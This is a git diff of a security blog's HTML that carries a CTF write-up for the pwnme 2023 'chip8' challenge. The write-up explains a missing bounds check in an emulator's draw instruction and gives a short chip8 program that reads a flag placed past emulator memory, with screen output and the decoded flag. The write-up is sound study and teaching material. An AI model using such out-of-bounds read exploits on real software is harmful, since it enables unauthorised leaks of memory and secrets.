-  <svg class="icon gblog_date"><use xlink:href="#gblog_date"></use></svg>
-  <span class="gblog-post__tag">
-    <time datetime="2023-05-08T00:00:00Z">
-      
-      May 8, 2023
-    </time>
-  </span>
-</span>
-
-<span class="flex align-center no-wrap">
-  <svg class="icon gblog_timer"><use xlink:href="#gblog_timer"></use></svg>
-  <span class="gblog-post__tag">8 min read</span>
-</span>
-
-
-
-
-
-
-
-
-  
-    
-    
-      
-        <span class="flex align-center no-wrap">
-          <svg class="icon gblog_bookmark"><use xlink:href="#gblog_bookmark"></use></svg>
-          
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/chip8/"
-      title="All posts tagged with 'chip8'"
-    >
-      chip8
-    </a>
-  </span>
-
-        </span>
-      
-    
-    
-  
-    
-    
-      
-        
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/ctf/"
-      title="All posts tagged with 'ctf'"
-    >
-      ctf
-    </a>
-  </span>
-
-      
-    
-    
-  
-    
-    
-      
-        
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/emulator/"
-      title="All posts tagged with 'emulator'"
-    >
-      emulator
-    </a>
-  </span>
-
-      
-    
-    
-  
-    
-    
-      
-        
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/linux/"
-      title="All posts tagged with 'linux'"
-    >
-      linux
-    </a>
-  </span>
-
-      
-    
-    
-  
-    
-    
-      
-        
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/nasm/"
-      title="All posts tagged with 'nasm'"
-    >
-      nasm
-    </a>
-  </span>
-
-      
-    
-    
-  
-    
-    
-      
-        
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/pwn/"
-      title="All posts tagged with 'pwn'"
-    >
-      pwn
-    </a>
-  </span>
-
-      
-    
-    
-  
-    
-    
-      
-        
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/pwnme/"
-      title="All posts tagged with 'pwnme'"
-    >
-      pwnme
-    </a>
-  </span>
-
-      
-    
-    
-  
-
-
-
-
-
-
-        </div>
-      
-    </header>
-    <section class="gblog-markdown">
-      <div class="gblog-post__anchorwrap">
-    <h2 id="chip8">
-        chip8
-        <a data-clipboard-text="https://nasm.re/posts/chip8/#chip8" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor chip8" href="#chip8">
-            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
-        </a>
-    </h2>
+<div id="banner" class="">
+  <img src="/pic/wall.png" itemprop="image">
+  <div id="banner-dim"></div>
 </div>
-<blockquote>
+ 
+   
+  <div id="main-grid" class="shadow   ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>repr </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/archives">Archives</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
+      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
+        <span class="material-symbols-rounded rss">rss_feed</span>
+      </a>
+    
+    <a id="nav-search-btn" class="nav-icon" title="Search" style="display: none;">
+      <span class="material-symbols-rounded">search</span>
+    </a>
+    <div id="nav-menu-btn" class="nav-icon">
+      <span class="material-symbols-rounded">menu</span>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/archives">Archives</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <image src=https://cdn.discordapp.com/attachments/755522926819934349/1135933820852502589/chtholly_nota_seniorious_by_asukaln_dfhx63b-414w-2x.jpg></image>
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">nasm </div>
+      <div class="dot"></div>
+      <div class="subtitle">pwn / kernel stuff </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com/nasm_re" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/n4sm" title="GitHub"><i class="fa-brands fa-github"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://ret2school.github.io/discord" title="Discord"><i class="fa-brands fa-discord"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+  <div class="sticky">
+    
+      
+
+
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Categories</h3>
+      <div class="category-box">
+            <a class="category-link" href="/categories/pwn/">
+                pwn
+                <div class="category-count">19</div>
+            </a>
+        
+            <a class="category-link" href="/categories/kernel/">
+                kernel
+                <div class="category-count">3</div>
+            </a>
+        </div>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Recent Posts</h3>
+      <ul>
+        
+          <a class="recent-link" href="/posts/iwindow/" title="[ImaginaryCTF 2023 - pwn] window-of-opportunity" >
+            <div class="recent-link-text">
+              [ImaginaryCTF 2023 - pwn] window-of-opportunity
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/posts/mailman/" title="[ImaginaryCTF 2023 - pwn] mailman" >
+            <div class="recent-link-text">
+              [ImaginaryCTF 2023 - pwn] mailman
+            </div>
+          </a>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+<article id="post-chip8" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        [pwnme 2023 - pwn] chip8
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2023-05-07T22:00:00.000Z" itemprop="datePublished">2023-05-08</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+  <a class="meta-cate-link" href="/categories/pwn/">pwn</a>
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            1.5k words 
+          </div>
+        </div>
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chip8/" rel="tag">chip8</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/emulator/" rel="tag">emulator</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nasm/" rel="tag">nasm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnme/" rel="tag">pwnme</a></li></ul>
+
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <h2 id="chip8"><a href="#chip8" class="headerlink" title="chip8"></a>chip8</h2><blockquote>
 <p>Solves: 24  Easy</p>
-<p>I just found a repo of a chip-8 emulator, it may be vulnerable but I didn&rsquo;t had enough time to report the vulnerability with a working PoC.
-You must find a way to get the flag in memory on the remote service !</p>
+<p>I just found a repo of a chip-8 emulator, it may be vulnerable but I didn’t had enough time to report the vulnerability with a working PoC.<br>You must find a way to get the flag in memory on the remote service !</p>
 <p>Author: Express#8049</p>
 <p>Remote service at : nc 51.254.39.184 1337</p>
 </blockquote>
-<p>chip8 is a emulator-pwn challenge I did during the <a
-  class="gblog-markdown__link"
-  href="https://pwnme.fr/"
-  
-  >pwnme CTF</a
-> . You can find the related files <a
-  class="gblog-markdown__link"
-  href="https://github.com/ret2school/ctf/tree/master/2023/pwnme/pwn/chip8"
-  
-  >here</a
->.</p>
-<div class="gblog-post__anchorwrap">
-    <h2 id="code-review">
-        Code review
-        <a data-clipboard-text="https://nasm.re/posts/chip8/#code-review" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Code review" href="#code-review">
-            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
-        </a>
-    </h2>
-</div>
-<p>This challenge is based on an emulator called <a
-  class="gblog-markdown__link"
-  href="https://github.com/LakshyAAAgrawal/chip8emu"
-  
-  >c8emu</a
-> that is updated with these lines of code:</p>
-<pre tabindex="0"><code>diff --git a/include/Machine.hpp b/include/Machine.hpp
-index af3d0d7..4288e15 100644
---- a/include/Machine.hpp
-+++ b/include/Machine.hpp
-@@ -17,6 +17,7 @@ class Machine{
- private:
- 	std::vector&lt;uint8_t&gt; registers; // V0-VF
- 	std::vector&lt;uint8_t&gt; memory; // Memory
-+	std::vector&lt;uint8_t&gt; flag;
- 	uint16_t I; // Index register
- 	std::vector&lt;uint16_t&gt; stack; // Stack
- 	uint8_t SP; // Stack Pointer
-diff --git a/src/Machine.cpp b/src/Machine.cpp
-index d34680e..2321296 100644
---- a/src/Machine.cpp
-+++ b/src/Machine.cpp
-@@ -6,10 +6,13 @@
- #include &lt;chrono&gt;
- #include &lt;thread&gt;
- 
-+std::string FLAG = &quot;PWNME{THIS_IS_A_SHAREHOLDER_AAAAAAAAAAAAAAAAAA}&quot;;
-+
- Machine::Machine(){
- 	registers = std::vector&lt;uint8_t&gt;(16, 0);
- 	stack = std::vector&lt;uint16_t&gt;(32, 0);
- 	memory = std::vector&lt;uint8_t&gt;(4096, 0);
-+	flag = std::vector&lt;uint8_t&gt;(128, 0);
- 	PC = 0x200;
- 	last_tick = std::chrono::steady_clock::now();
- 	I = 0;
-@@ -134,8 +137,8 @@ void Machine::execute(uint16_t&amp; opcode){
+<p>chip8 is a emulator-pwn challenge I did during the <a target="_blank" rel="noopener" href="https://pwnme.fr/">pwnme CTF</a> . You can find the related files <a target="_blank" rel="noopener" href="https://github.com/ret2school/ctf/tree/master/2023/pwnme/pwn/chip8">here</a>.</p>
+<h2 id="Code-review"><a href="#Code-review" class="headerlink" title="Code review"></a>Code review</h2><p>This challenge is based on an emulator called <a target="_blank" rel="noopener" href="https://github.com/LakshyAAAgrawal/chip8emu">c8emu</a> that is updated with these lines of code:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/include/Machine.hpp b/include/Machine.hpp</span><br><span class="line">index af3d0d7..4288e15 100644</span><br><span class="line">--- a/include/Machine.hpp</span><br><span class="line">+++ b/include/Machine.hpp</span><br><span class="line">@@ -17,6 +17,7 @@ class Machine&#123;</span><br><span class="line"> private:</span><br><span class="line"> 	std::vector&lt;uint8_t&gt; registers; // V0-VF</span><br><span class="line"> 	std::vector&lt;uint8_t&gt; memory; // Memory</span><br><span class="line">+	std::vector&lt;uint8_t&gt; flag;</span><br><span class="line"> 	uint16_t I; // Index register</span><br><span class="line"> 	std::vector&lt;uint16_t&gt; stack; // Stack</span><br><span class="line"> 	uint8_t SP; // Stack Pointer</span><br><span class="line">diff --git a/src/Machine.cpp b/src/Machine.cpp</span><br><span class="line">index d34680e..2321296 100644</span><br><span class="line">--- a/src/Machine.cpp</span><br><span class="line">+++ b/src/Machine.cpp</span><br><span class="line">@@ -6,10 +6,13 @@</span><br><span class="line"> #include &lt;chrono&gt;</span><br><span class="line"> #include &lt;thread&gt;</span><br><span class="line"> </span><br><span class="line">+std::string FLAG = &quot;PWNME&#123;THIS_IS_A_SHAREHOLDER_AAAAAAAAAAAAAAAAAA&#125;&quot;;</span><br><span class="line">+</span><br><span class="line"> Machine::Machine()&#123;</span><br><span class="line"> 	registers = std::vector&lt;uint8_t&gt;(16, 0);</span><br><span class="line"> 	stack = std::vector&lt;uint16_t&gt;(32, 0);</span><br><span class="line"> 	memory = std::vector&lt;uint8_t&gt;(4096, 0);</span><br><span class="line">+	flag = std::vector&lt;uint8_t&gt;(128, 0);</span><br><span class="line"> 	PC = 0x200;</span><br><span class="line"> 	last_tick = std::chrono::steady_clock::now();</span><br><span class="line"> 	I = 0;</span><br><span class="line">@@ -134,8 +137,8 @@ void Machine::execute(uint16_t&amp; opcode)&#123;</span><br><span class="line"></span><br><span class="line"> 	if(it != first_match.end()) (it-&gt;second)(opcode);</span><br><span class="line"> 	else &#123;</span><br><span class="line">-		std::cout &lt;&lt; &quot;No match found for opcode &quot; &lt;&lt; std::hex &lt;&lt; (int) opcode &lt;&lt; &quot;\n&quot;;</span><br><span class="line">-		std::cout &lt;&lt; &quot;This could be because this ROM uses SCHIP or another extension which is not yet supported.\n&quot;;</span><br><span class="line">+		//std::cout &lt;&lt; &quot;No match found for opcode &quot; &lt;&lt; std::hex &lt;&lt; (int) opcode &lt;&lt; &quot;\n&quot;;</span><br><span class="line">+		//std::cout &lt;&lt; &quot;This could be because this ROM uses SCHIP or another extension which is not yet supported.\n&quot;;</span><br><span class="line"> 		std::exit(0);</span><br><span class="line"> 	&#125;</span><br><span class="line"> &#125;</span><br><span class="line">@@ -179,12 +182,13 @@ void Machine::print_machine_state()&#123;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> void Machine::runLoop()&#123;</span><br><span class="line">+	std::copy(FLAG.begin(), FLAG.end(), flag.begin());</span><br><span class="line"> 	while(true)&#123;</span><br><span class="line"> 		// Update display</span><br><span class="line"> 		if(ge.is_dirty())&#123; // Check if the screen has to be updated</span><br><span class="line"> 			ge.update_display();</span><br><span class="line">-			print_machine_state();</span><br><span class="line">-			std::cout &lt;&lt; &quot;Opcode &quot; &lt;&lt; ((uint16_t) (memory[PC]&lt;&lt;8) | (memory[PC+1])) &lt;&lt; &quot;\n&quot;;</span><br><span class="line">+			//print_machine_state();</span><br><span class="line">+			//std::cout &lt;&lt; &quot;Opcode &quot; &lt;&lt; ((uint16_t) (memory[PC]&lt;&lt;8) | (memory[PC+1])) &lt;&lt; &quot;\n&quot;;</span><br><span class="line"> 		&#125;</span><br><span class="line"> </span><br><span class="line"> 		// Update the keyboard buffer to check for all pressed keys</span><br><span class="line">diff --git a/src/c8emu.cpp b/src/c8emu.cpp</span><br><span class="line">index e65123b..590228e 100644</span><br><span class="line">--- a/src/c8emu.cpp</span><br><span class="line">+++ b/src/c8emu.cpp</span><br><span class="line">@@ -17,6 +17,10 @@ void loadFile(const std::string&amp; filename, std::vector&lt;uint8_t&gt;&amp; prog)&#123;</span><br><span class="line"> int main(int argc, char ** argv)&#123;</span><br><span class="line"> 	Machine machine;</span><br><span class="line"> </span><br><span class="line">+	setbuf(stdin, NULL);</span><br><span class="line">+	setbuf(stdout, NULL);</span><br><span class="line">+	setbuf(stderr, NULL);</span><br><span class="line">+</span><br><span class="line"> 	&#123; // Create block to deallocate the possibly large variable prog</span><br><span class="line"> 		// Load Instructions</span><br><span class="line"> 		std::vector&lt;uint8_t&gt; prog;</span><br></pre></td></tr></table></figure>
 
- 	if(it != first_match.end()) (it-&gt;second)(opcode);
- 	else {
--		std::cout &lt;&lt; &quot;No match found for opcode &quot; &lt;&lt; std::hex &lt;&lt; (int) opcode &lt;&lt; &quot;\n&quot;;
--		std::cout &lt;&lt; &quot;This could be because this ROM uses SCHIP or another extension which is not yet supported.\n&quot;;
-+		//std::cout &lt;&lt; &quot;No match found for opcode &quot; &lt;&lt; std::hex &lt;&lt; (int) opcode &lt;&lt; &quot;\n&quot;;
-+		//std::cout &lt;&lt; &quot;This could be because this ROM uses SCHIP or another extension which is not yet supported.\n&quot;;
- 		std::exit(0);
- 	}
- }
-@@ -179,12 +182,13 @@ void Machine::print_machine_state(){
- }
- 
- void Machine::runLoop(){
-+	std::copy(FLAG.begin(), FLAG.end(), flag.begin());
- 	while(true){
- 		// Update display
- 		if(ge.is_dirty()){ // Check if the screen has to be updated
- 			ge.update_display();
--			print_machine_state();
--			std::cout &lt;&lt; &quot;Opcode &quot; &lt;&lt; ((uint16_t) (memory[PC]&lt;&lt;8) | (memory[PC+1])) &lt;&lt; &quot;\n&quot;;
-+			//print_machine_state();
-+			//std::cout &lt;&lt; &quot;Opcode &quot; &lt;&lt; ((uint16_t) (memory[PC]&lt;&lt;8) | (memory[PC+1])) &lt;&lt; &quot;\n&quot;;
- 		}
- 
- 		// Update the keyboard buffer to check for all pressed keys
-diff --git a/src/c8emu.cpp b/src/c8emu.cpp
-index e65123b..590228e 100644
---- a/src/c8emu.cpp
-+++ b/src/c8emu.cpp
-@@ -17,6 +17,10 @@ void loadFile(const std::string&amp; filename, std::vector&lt;uint8_t&gt;&amp; prog){
- int main(int argc, char ** argv){
- 	Machine machine;
- 
-+	setbuf(stdin, NULL);
-+	setbuf(stdout, NULL);
-+	setbuf(stderr, NULL);
-+
- 	{ // Create block to deallocate the possibly large variable prog
- 		// Load Instructions
- 		std::vector&lt;uint8_t&gt; prog;
-</code></pre><p>As you can see above, the prints that can leak informations about the program execution are removed, and an array named <code>flag</code> (on the heap) is inserted right after the memory mapping of length <code>0x1000</code> (on the heap) of the chip8 program. This way the goal would be to be able to leak the content of <code>flag</code> onto the screen.</p>
-<div class="gblog-post__anchorwrap">
-    <h2 id="few-words-on-chip8-architecture">
-        few words on chip8 architecture
-        <a data-clipboard-text="https://nasm.re/posts/chip8/#few-words-on-chip8-architecture" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor few words on chip8 architecture" href="#few-words-on-chip8-architecture">
-            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
-        </a>
-    </h2>
-</div>
-<p>To get a quick overview of the chip8 arch, I advice you to read <a
-  class="gblog-markdown__link"
-  href="http://devernay.free.fr/hacks/chip8/C8TECH10.HTM#0.0"
-  
-  >this</a
->. Here are the most important informations from the technical reference:</p>
+<p>As you can see above, the prints that can leak informations about the program execution are removed, and an array named <code>flag</code> (on the heap) is inserted right after the memory mapping of length <code>0x1000</code> (on the heap) of the chip8 program. This way the goal would be to be able to leak the content of <code>flag</code> onto the screen.</p>
+<h2 id="few-words-on-chip8-architecture"><a href="#few-words-on-chip8-architecture" class="headerlink" title="few words on chip8 architecture"></a>few words on chip8 architecture</h2><p>To get a quick overview of the chip8 arch, I advice you to read <a target="_blank" rel="noopener" href="http://devernay.free.fr/hacks/chip8/C8TECH10.HTM#0.0">this</a>. Here are the most important informations from the technical reference:</p>
 <ul>
 <li>Chip-8 is a simple, interpreted, programming language which was first used on some do-it-yourself computer systems in the late 1970s and early 1980s. The COSMAC VIP, DREAM 6800, and ETI 660 computers are a few examples. These computers typically were designed to use a television as a display, had between 1 and 4K of RAM, and used a 16-key hexadecimal keypad for input. The interpreter took up only 512 bytes of memory, and programs, which were entered into the computer in hexadecimal, were even smaller.</li>
 <li>Chip-8 has 16 general purpose 8-bit registers, usually referred to as Vx, where x is a hexadecimal digit (0 through F). There is also a 16-bit register called I. This register is generally used to store memory addresses, so only the lowest (rightmost) 12 bits are usually used.</li>
-<li>Here are the instruction we need:
-<ul>
-<li><code>Annn</code> - <code>LD I, addr</code>. Set I = nnn. The value of register I is set to nnn.</li>
-<li><code>6xkk</code> - <code>LD Vx, byte</code>, Set Vx = kk. The interpreter puts the value kk into register Vx.</li>
-<li><code>Fx1E</code> - <code>ADD I, Vx</code>. Set I = I + Vx. The values of I and Vx are added, and the results are stored in I.</li>
-<li><code>Dxyn</code> - <code>DRW Vx, Vy, nibble</code>. Display n-byte sprite starting at memory location I at (Vx, Vy), set VF = collision. The interpreter reads n bytes from memory, starting at the address stored in I. These bytes are then displayed as sprites on screen at coordinates (Vx, Vy). Sprites are XORed onto the existing screen. If this causes any pixels to be erased, VF is set to 1, otherwise it is set to 0. If the sprite is positioned so part of it is outside the coordinates of the display, it wraps around to the opposite side of the screen. See instruction 8xy3 for more information on XOR, and section 2.4, Display, for more information on the Chip-8 screen and sprites.</li>
+<li>Here are the instruction we need: <ul>
+<li><code>Annn</code> - <code>LD I, addr</code>. Set I &#x3D; nnn. The value of register I is set to nnn.</li>
+<li><code>6xkk</code> - <code>LD Vx, byte</code>, Set Vx &#x3D; kk. The interpreter puts the value kk into register Vx. </li>
+<li><code>Fx1E</code> - <code>ADD I, Vx</code>. Set I &#x3D; I + Vx. The values of I and Vx are added, and the results are stored in I.</li>
+<li><code>Dxyn</code> - <code>DRW Vx, Vy, nibble</code>. Display n-byte sprite starting at memory location I at (Vx, Vy), set VF &#x3D; collision. The interpreter reads n bytes from memory, starting at the address stored in I. These bytes are then displayed as sprites on screen at coordinates (Vx, Vy). Sprites are XORed onto the existing screen. If this causes any pixels to be erased, VF is set to 1, otherwise it is set to 0. If the sprite is positioned so part of it is outside the coordinates of the display, it wraps around to the opposite side of the screen. See instruction 8xy3 for more information on XOR, and section 2.4, Display, for more information on the Chip-8 screen and sprites.</li>
 </ul>
 </li>
 </ul>
-<pre tabindex="0"><code class="language-nnn" data-lang="nnn">n or nibble - A 4-bit value, the lowest 4 bits of the instruction
-x - A 4-bit value, the lower 4 bits of the high byte of the instruction
-y - A 4-bit value, the upper 4 bits of the low byte of the instruction
-kk or byte - An 8-bit value, the lowest 8 bits of the instruction 
-</code></pre><div class="gblog-post__anchorwrap">
-    <h2 id="the-bug">
-        The bug
-        <a data-clipboard-text="https://nasm.re/posts/chip8/#the-bug" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor The bug" href="#the-bug">
-            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
-        </a>
-    </h2>
-</div>
-<p>The bug lies into the implementation around the instruction that use the <code>I</code> register. Indeed, as you read above, the <code>I</code> register is 16 bits wide. Thus we could we print onto the screen with the help of the <code>DRW</code> instruction data stored from <code>memory[I=0]</code> up to <code>memory[I=2^16 - 1]</code>. Let&rsquo;s see how does it  handle the <code>DRW</code> instruction:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://github.com/LakshyAAAgrawal/chip8emu/blob/master/src/Machine.cpp#L123
-</span><span class="c1"></span>
-<span class="p">{</span><span class="mh">0xd000</span><span class="p">,</span> <span class="p">[</span><span class="n">this</span><span class="p">](</span><span class="kt">uint16_t</span><span class="o">&amp;</span> <span class="n">op</span><span class="p">){</span> <span class="c1">// TODO - Dxyn - DRW Vx, Vy, nibble
-</span><span class="c1"></span>    <span class="n">registers</span><span class="p">[</span><span class="mh">0xf</span><span class="p">]</span> <span class="o">=</span> <span class="n">ge</span><span class="p">.</span><span class="n">draw_sprite</span><span class="p">(</span><span class="n">memory</span><span class="p">.</span><span class="n">begin</span><span class="p">()</span> <span class="o">+</span> <span class="n">I</span><span class="p">,</span> <span class="n">memory</span><span class="p">.</span><span class="n">begin</span><span class="p">()</span> <span class="o">+</span> <span class="n">I</span> <span class="o">+</span> <span class="p">(</span><span class="n">op</span> <span class="o">&amp;</span> <span class="mh">0x000f</span><span class="p">),</span> <span class="n">registers</span><span class="p">[(</span><span class="n">op</span> <span class="o">&amp;</span> <span class="mh">0x0f00</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">8</span><span class="p">]</span> <span class="o">%</span> <span class="mh">0x40</span><span class="p">,</span> <span class="n">registers</span><span class="p">[(</span><span class="n">op</span> <span class="o">&amp;</span> <span class="mh">0x00f0</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">4</span><span class="p">]</span> <span class="o">%</span> <span class="mh">0x20</span><span class="p">);</span>
-<span class="p">}}</span>
-</code></pre></div><p>The first and the second argument are the begin and the end of the location where data to print are stored. <code>(op &amp; 0x000f)</code> represents the amount of bytes we&rsquo;d like to print. As you can see no checks are performed, this way we able to get a read out of bound from from <code>memory[I=0]</code> up to <code>memory[I=2^16 - 1]</code>.</p>
-<div class="gblog-post__anchorwrap">
-    <h2 id="exploitation">
-        Exploitation
-        <a data-clipboard-text="https://nasm.re/posts/chip8/#exploitation" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Exploitation" href="#exploitation">
-            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
-        </a>
-    </h2>
-</div>
-<p>Now we now how we could exfiltrate the flag we can write this tiny chip8 program:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">code</span> <span class="o">=</span> <span class="p">[</span>
-    <span class="mh">0xAFFF</span><span class="p">,</span> <span class="c1"># Annn - LD I, addr, I  = 0xfff</span>
-    <span class="mh">0x6111</span><span class="p">,</span> <span class="c1"># 6xkk - LD Vx, byte, R1 = 0x11</span>
-    <span class="mh">0xF11E</span><span class="p">,</span> <span class="c1"># ADD I, R1, I =&gt; 0x1010</span>
-    <span class="mh">0xDBCF</span>  <span class="c1"># Write on screen (xored with current pixels) 15 bytes from I=0x1010</span>
-<span class="p">]</span>
-</code></pre></div><p>We read the flag from <code>memory[0x1010]</code> given <code>memory</code> is adjacent to the <code>flag</code> (<code>memory[0x1000]</code> == begin of the chunk <code>flag</code> within the heap), and we add <code>0x10</code> to read the chunk content which is right after the header (prev_sz and chunk_sz). Once we launch it we get:</p>
-<pre tabindex="0"><code>python3 exploit.py REMOTE HOST=51.254.39.184 PORT=1337
-[*] '/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ret2school/ctf/2023/pwnme/pwn/chip8/wrapper'
-    Arch:     amd64-64-little
-╔════════════════════════════════════════════════════════════════╗
-║ █ █ ▄▄▄                                                        ║
-║ █  ██▀▄                                                        ║
-║ █▄▄▄▀▄█                                                        ║
-║ █  ▄ ▀▀                                                        ║
-║ ▄██   ▀                                                        ║
-║  █▄█▀ ▀                                                        ║
-║ ▀▄█▀▀██                                                        ║
-║ ▀▀ ▀▀ ▀                                                        ║
-</code></pre><p>If we decode chars by hand (each byte is a line for which white is 1 and black zero), we get:</p>
-<pre tabindex="0"><code>╔════════════════════════════════════════════════════════════════╗
-║ █ █ ▄▄▄                                                        ║PW
-║ █  ██▀▄                                                        ║NM
-║ █▄▄▄▀▄█                                                        ║E{
-║ █  ▄ ▀▀                                                        ║CH
-║ ▄██   ▀                                                        ║18
-║  █▄█▀ ▀                                                        ║-8
-║ ▀▄█▀▀██                                                        ║_3
-║ ▀▀ ▀▀ ▀                                                         m
-</code></pre><p>If we repeat this step 4 times (by incrementing the value of V1), we finally managed to get the flag: <code>PWNME{CH1p-8_3mu14t0r_1s_h4Ck4bl3_1n_2023_y34h}</code>.</p>
-<div class="gblog-post__anchorwrap">
-    <h2 id="full-exploit">
-        Full exploit
-        <a data-clipboard-text="https://nasm.re/posts/chip8/#full-exploit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Full exploit" href="#full-exploit">
-            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
-        </a>
-    </h2>
-</div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
-<span class="c1"># -*- coding: utf-8 -*-</span>
